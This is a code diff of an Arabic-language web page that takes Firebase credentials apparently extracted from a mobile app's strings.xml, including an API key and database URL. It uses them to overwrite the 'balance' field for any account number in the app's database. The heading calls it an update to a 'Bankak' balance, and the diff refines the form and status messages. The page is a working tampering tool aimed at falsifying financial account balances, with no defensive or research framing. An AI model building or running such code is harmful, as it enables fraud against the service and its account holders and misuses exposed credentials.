@@ -8,40 +8,66 @@
     <style>
         body { font-family: sans-serif; text-align: center; padding: 20px; background: #f0f2f5; }
         .card { background: white; padding: 20px; border-radius: 10px; display: inline-block; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        input { display: block; width: 250px; margin: 10px auto; padding: 10px; border: 1px solid #ddd; border-radius: 5px; }
-        button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; width: 100%; }
+        input { display: block; width: 280px; margin: 10px auto; padding: 12px; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; }
+        button { background: #007bff; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; }
+        button:hover { background: #0056b3; }
+        #status { margin-top: 15px; font-weight: bold; }
     </style>
 </head>
 <body>
+
     <div class="card">
-        <h3>تحديث رصيد السيرفر</h3>
-        <input type="text" id="nodeName" placeholder="اسم المستخدم (مثل: user_1)">
-        <input type="number" id="balanceValue" placeholder="المبلغ الجديد">
-        <button onclick="updateData()">تحديث الآن</button>
-        <p id="msg"></p>
+        <h3>تحديث رصيد بنكك (السيرفر)</h3>
+        
+        <label>رقم الحساب (account_number):</label>
+        <input type="text" id="accNum" placeholder="مثال: 4967225" value="4967225">
+        
+        <label>المبلغ الجديد (balance):</label>
+        <input type="number" id="newBal" placeholder="أدخل المبلغ هنا">
+        
+        <button onclick="sendUpdate()">تحديث السيرفر الآن</button>
+        
+        <div id="status"></div>
     </div>
 
     <script>
-        // البيانات المستخرجة من ملف Strings الخاص بك
-        const config = {
+        // إعدادات Firebase من ملف strings.xml الخاص بك
+        const firebaseConfig = {
             apiKey: "AIzaSyBR1lzuYqNUg1yRRdiNau4o6rjzpX8GjRo",
             databaseURL: "https://ontest-92fe9-default-rtdb.firebaseio.com",
             projectId: "ontest-92fe9"
         };
-        firebase.initializeApp(config);
-        const db = firebase.database();
 
-        function updateData() {
-            const node = document.getElementById('nodeName').value;
-            const val = document.getElementById('balanceValue').value;
-            
-            // التحديث في مسار user_session
-            db.ref('user_session/' + node).update({
-                balance: parseFloat(val)
-            }).then(() => {
-                document.getElementById('msg').innerText = "✅ تم التحديث بنجاح";
-            }).catch(err => {
-                document.getElementById('msg').innerText = "❌ خطأ: " + err.message;
+        // تهيئة Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        function sendUpdate() {
+            const account = document.getElementById('accNum').value;
+            const balance = document.getElementById('newBal').value;
+            const statusDiv = document.getElementById('status');
+
+            if (!account || !balance) {
+                statusDiv.innerText = "⚠️ يرجى إدخال رقم الحساب والمبلغ";
+                statusDiv.style.color = "orange";
+                return;
+            }
+
+            statusDiv.innerText = "⏳ جاري الاتصال بالسيرفر...";
+            statusDiv.style.color = "blue";
+
+            // التحديث في مسار user_session/account_number
+            database.ref('user_session/' + account).update({
+                balance: parseFloat(balance)
+            })
+            .then(() => {
+                statusDiv.innerText = "✅ تم تحديث الرصيد للحساب " + account + " بنجاح!";
+                statusDiv.style.color = "green";
+            })
+            .catch((error) => {
+                statusDiv.innerText = "❌ فشل التحديث: " + error.message;
+                statusDiv.style.color = "red";
+                console.error(error);
             });
         }
     </script>
